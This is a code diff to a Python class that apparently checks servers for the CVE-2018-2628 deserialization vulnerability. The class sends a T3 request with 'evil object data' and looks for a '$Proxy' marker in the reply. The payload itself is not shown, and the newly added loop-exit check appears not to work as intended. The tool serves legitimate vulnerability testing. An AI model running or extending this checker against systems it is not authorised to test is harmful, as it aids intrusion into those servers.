@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 
 import re
-import time
 import socket
 import asyncio
 from urllib.parse import urlparse
@@ -59,6 +58,8 @@ class CVE_2018_2628_BaseVerify:
             try:
                 while True:
                     res += str(sock.recv(4096))
+                    if not res:
+                        break
                     await asyncio.sleep(0.1)
             except Exception as e:
                 # print(e)
@@ -87,7 +88,7 @@ class CVE_2018_2628_BaseVerify:
                 await self.buildT3RequestObject(sock, self.port)
                 rs = await self.sendEvilObjData(sock, self.payload)
                 if rs:
-                    p = re.findall('\\$Proxy[0-9]+', str(rs), re.S)
+                    p = re.findall('\\$Proxy[0-9]+', rs, re.S)
                     if len(p)>0:
                         # print('存在CVE-2018-2628漏洞')
                         return True
